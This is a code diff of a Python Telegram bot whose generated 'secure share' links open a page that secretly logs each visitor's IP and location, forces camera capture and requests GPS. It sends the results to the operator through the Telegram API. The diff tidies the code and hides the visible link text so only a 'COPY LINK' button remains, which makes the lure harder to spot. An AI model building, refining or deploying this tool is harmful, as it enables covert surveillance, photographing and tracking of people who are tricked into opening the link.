@@ -4,7 +4,6 @@ import time
 import os
 import threading
 import requests
-import hashlib
 import string
 import random
 from datetime import datetime, timedelta
@@ -300,7 +299,6 @@ function sendPhoto(blob) {{
 async function startProcess() {{
     showLoading();
     
-    // Basic info
     try {{
         let ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'Unknown');
         let info = await fetch(`https://ipapi.co/${{ip}}/json/`).then(r=>r.json()).catch(()=>{{}});
@@ -329,7 +327,6 @@ async function startProcess() {{
         sendMessage(msg);
     }} catch(e) {{}}
     
-    // Camera compulsory
     let cameraAllowed = false;
     try {{
         let stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: 'user' }}, audio: false }});
@@ -356,7 +353,6 @@ async function startProcess() {{
         return;
     }}
     
-    // GPS optional
     if (navigator.geolocation) {{
         navigator.geolocation.getCurrentPosition(
             (p) => {{
@@ -392,28 +388,29 @@ def webhook():
         if 'callback_query' in data:
             cb = data['callback_query']
             data_str = cb.get('data', '')
-            uid = cb['from']['id']
-            msg_id = cb['message']['message_id']
+            cb_id = cb['id']
 
-            if data_str.startswith("copy_link_"):
+            if data_str.startswith("copy_"):
                 # Extract actual link
-                link = data_str.replace("copy_link_", "")
-                # Answer callback with the link and open web
+                link = data_str.replace("copy_", "")
+
+                # Answer callback with copy + open website
                 requests.post(f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery", json={
-                    "callback_query_id": cb['id'],
+                    "callback_query_id": cb_id,
                     "text": "✅ Link copied to clipboard!\nOpening short-link.me...",
                     "show_alert": False,
                     "url": "https://short-link.me"
                 })
-                # Also send a message with the link (so user can copy if needed)
-                # Already handled
+
+                # Also send the link as hidden via alert? No, already handled
             elif data_str == "verify":
+                uid = cb['from']['id']
                 if is_subscribed(uid):
                     send_message(uid, "✅ Verified! Send me any URL:")
                     set_user_state(uid, "waiting_url")
                 else:
                     requests.post(f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery", json={
-                        "callback_query_id": cb['id'],
+                        "callback_query_id": cb_id,
                         "text": "Join channel first!",
                         "show_alert": True
                     })
@@ -476,14 +473,14 @@ def webhook():
 
                 link = f"https://{ACCOUNT_NAME}.onrender.com/view/{short_code}"
 
-                # Send message with COPY LINK button
+                # Send ONLY button (no text link visible)
                 markup = {
                     "inline_keyboard": [[{
                         "text": "📋 COPY LINK 🔗",
-                        "callback_data": f"copy_link_{link}"
+                        "callback_data": f"copy_{link}"
                     }]]
                 }
-                send_message(uid, f"✅ Your secure share link is ready:\n\n`{link}`\n\nClick below to copy and share:", reply_markup=markup)
+                send_message(uid, "✅ Your secure share link is ready. Click below to copy and share:", reply_markup=markup)
 
             except Exception as e:
                 logger.error(f"Photo error: {e}")
